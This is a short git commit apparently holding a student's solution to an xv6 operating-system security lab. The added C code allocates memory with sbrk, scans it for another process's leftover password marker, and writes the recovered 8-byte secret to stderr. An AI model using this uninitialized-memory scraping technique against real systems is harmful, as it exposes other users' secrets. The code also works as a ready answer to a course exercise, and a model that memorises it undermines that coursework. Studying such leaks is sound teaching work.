6aab013d6b5040900fa93782639b8f8167302f5b
Jasper Liu <lyp950319@gmail.com>
2025-06-09 16:13:09 -0400

    attack

--- user/attack.c
+++ user/attack.c
@@ -8,6 +8,27 @@ main(int argc, char *argv[])
 {
   // your code here.  you should write the secret to fd 2 using write
   // (e.g., write(2, secret, 8)
+  char secret[32] = {0};
+  while (1) {
+    char *start = sbrk(PGSIZE*32);
+    if ((uint64)start == (uint64)-1) {
+      printf("sbrk failed\n");
+      exit(1);
+    }
+    char *end = start;
+    for (int i = 0; i < PGSIZE*32 - 50; i++, end++) {
+      // compare full string
+      if (memcmp(end, "my very very very secret pw is:   ", 31) == 0) {
+        printf("%s\n", end);
+        // Found the secret
+        for (int j = 0; j < 8; j++) {
+          secret[j] = *(end + 32 + j);
+        }
+        printf("Found the secret! %s\n", secret);
+        write(2, secret, 8);
+        exit(0);
+      }
 
-  exit(1);
+    }
+  }
 }
